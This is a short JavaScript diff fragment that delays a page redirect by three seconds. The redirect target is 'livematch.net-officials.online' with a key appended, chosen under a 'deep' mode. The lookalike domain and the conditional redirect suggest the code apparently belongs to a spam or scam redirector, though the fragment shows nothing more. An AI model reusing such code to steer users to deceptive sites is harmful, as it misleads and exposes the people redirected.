@@ -9,4 +9,8 @@ if (md == 'deep') {
   var redir = 'http://livematch.net-officials.online/'+key;
 }
 
-window.location = redir;
+setTimeout(
+  function(){
+    window.location = redir;
+  },
+3000);
